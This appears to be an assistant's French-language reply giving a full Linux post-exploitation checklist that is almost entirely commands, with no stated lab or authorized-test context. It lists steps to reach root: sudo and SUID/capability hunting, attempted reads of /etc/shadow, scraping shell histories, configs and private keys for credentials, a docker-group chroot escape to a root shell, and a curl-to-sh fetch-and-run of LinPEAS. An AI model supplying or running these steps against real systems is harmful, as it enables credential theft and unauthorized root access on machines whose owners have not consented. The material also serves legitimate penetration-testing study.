Voici l'équivalent complet pour Linux, organisé de la même façon.

## 1. Identité et contexte utilisateur

```bash
whoami
id
groups
cat /etc/passwd | grep -E "sh$"    # users avec un shell valide
sudo -l                             # droits sudo (crucial, à faire tôt)
```

## 2. Informations système générales

```bash
uname -a
cat /etc/os-release
cat /etc/issue
hostname
hostnamectl
lscpu
```

## 3. Réseau

```bash
ip a
ip route
ss -tulnp                    # ou netstat -tulnp si dispo
arp -a
cat /etc/hosts
cat /etc/resolv.conf
```

## 4. Utilisateurs et groupes du système

```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow 2>/dev/null   # rarement lisible, mais à tenter
lastlog
who
w
last
```

## 5. Processus et services

```bash
ps aux
ps -ef
ps aux | grep root            # process tournant en root, pistes de hijack
systemctl list-units --type=service --state=running
service --status-all 2>/dev/null
```

## 6. Partages réseau et montages

```bash
mount
cat /etc/fstab
showmount -e localhost 2>/dev/null   # exports NFS
df -h
```

## 7. Tâches planifiées (cron)

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/
crontab -l
crontab -l -u root 2>/dev/null
```

## 8. Pare-feu et sécurité

```bash
iptables -L -n 2>/dev/null
ufw status 2>/dev/null
getenforce 2>/dev/null        # statut SELinux
```

## 9. Logiciels et versions installées

```bash
dpkg -l 2>/dev/null           # Debian/Ubuntu
rpm -qa 2>/dev/null           # RHEL/CentOS
apt list --installed 2>/dev/null
```

## 10. Variables d'environnement et PATH

```bash
env
echo $PATH
```

## 11. Historique shell (souvent une mine de credentials)

```bash
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null
find / -name "*.bash_history" 2>/dev/null
```

## 12. Binaires SUID/SGID et capabilities — essentiel

```bash
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
getcap -r / 2>/dev/null                      # capabilities
```

## 13. Fichiers sensibles / recherche rapide de credentials

```bash
grep -r "password" /etc/ 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.config" 2>/dev/null
find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v -E "^/proc"
```

## 14. Vérification appartenance à des groupes sensibles (escape direct)

```bash
id
# Si "docker" présent :
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Commande "tout-en-un" pour un premier coup d'œil rapide

```bash
whoami; id; sudo -l; uname -a; cat /etc/os-release; ip a; cat /etc/passwd | grep sh$; find / -perm -4000 2>/dev/null
```

## Ordre logique conseillé

1. `whoami` / `id` / `sudo -l` → savoir qui tu es et ce que tu peux déjà exécuter en root
2. `uname -a` + `cat /etc/os-release` → repérer kernel/distro pour cibler un exploit connu
3. `cat /etc/passwd` → cartographie des comptes avec shell valide
4. `find / -perm -4000` + `getcap -r /` → SUID/capabilities, souvent la voie la plus rapide
5. `crontab -l` + `/etc/cron.d/` → tâches automatiques exploitables
6. `ps aux` → process root en cours, pistes de hijack
7. Puis lancer **LinPEAS** pour croiser tout automatiquement

```bash
# LinPEAS - le plus complet, à privilégier en premier
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# ou upload puis exécution locale
./linpeas.sh -a > linpeas_output.txt
```
